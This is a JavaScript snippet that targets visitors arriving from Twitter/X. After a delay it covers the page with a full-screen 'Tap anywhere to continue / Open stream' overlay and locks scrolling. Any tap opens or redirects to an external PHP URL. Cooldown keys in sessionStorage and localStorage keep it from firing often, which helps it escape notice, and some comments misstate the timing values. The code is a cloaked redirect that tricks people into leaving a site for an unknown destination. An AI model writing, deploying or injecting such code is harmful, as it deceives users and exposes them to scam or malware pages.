(function () {
  try {
    // === SETTING ===
    var target = "https://vidoy.fun/cB6Tyq0.php"; // tujuan (HTTPS)
    var cooldownMs = 17 * 1000;                   // 1 menit (ubah jika perlu)
    var delayMs    = 9000;                        // delay sebelum overlay muncul (3 detik)
    // ===============

    if (!/^https:\/\//i.test(target)) return;

    var qs = location.search + location.hash;
    if (/[?#](?:.*[&?])?noredir=1(?:&|$)/i.test(qs)) return;
    var forceX = /[?#](?:.*[&?])?onlyx=1(?:&|$)/i.test(qs);

    var REF = String(document.referrer || "");
    var UA  = String(navigator.userAgent || "");
    var isX = /(t\.co|twitter\.com)/i.test(REF) || /twitter/i.test(UA) || forceX;
    if (!isX) return;

    var page = location.origin + location.pathname;
    var sessKey = "x_ov_seen:" + page + "|" + target;
    var cdKey   = "x_ov_cd:"   + page + "|" + target;

    var now = Date.now();
    if (sessionStorage.getItem(sessKey)) return;
    var until = parseInt(localStorage.getItem(cdKey) || "0", 10);
    if (now < until) return;

    sessionStorage.setItem(sessKey, "1");
    localStorage.setItem(cdKey, String(now + cooldownMs));

    var overlay = document.createElement("div");
    overlay.id = "__x_overlay_redirect__";
    overlay.setAttribute("role", "button");
    overlay.setAttribute("aria-label", "Tap to continue");
    overlay.style.cssText = [
      "position:fixed","inset:0","z-index:2147483647",
      "background:rgba(0,0,0,0.72)","color:#fff",
      "display:flex","align-items:center","justify-content:center",
      "font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif",
      "font-size:18px","text-align:center",
      "cursor:pointer","user-select:none","-webkit-user-select:none",
      "touch-action:manipulation","-webkit-tap-highlight-color:transparent"
    ].join(";");
    overlay.innerHTML =
      '<div style="max-width:80%;line-height:1.4;">' +
      'Tap anywhere to continue<br><small style="opacity:.8;display:block;margin-top:.5rem;">Open stream</small>' +
      "</div>";

    var origOverflow = document.documentElement.style.overflow;
    document.documentElement.style.overflow = "hidden";

    function cleanup() {
      try { document.documentElement.style.overflow = origOverflow || ""; } catch(_) {}
      try { overlay.remove(); } catch(_) {}
    }

    function go() {
      var w = null, ok = false;
      try { w = window.open(target, "_blank"); ok = !!(w && !w.closed); } catch(_) {}
      if (ok) { cleanup(); return; }
      try { location.href = target; } catch(_) {}
      cleanup();
    }

    overlay.addEventListener("click", go, { once:true, passive:true });
    overlay.addEventListener("touchstart", go, { once:true, passive:true });

    // Delay sebelum overlay dipasang
    setTimeout(function () {
      (document.body || document.documentElement).appendChild(overlay);
    }, delayMs);

  } catch (_) {}
})();
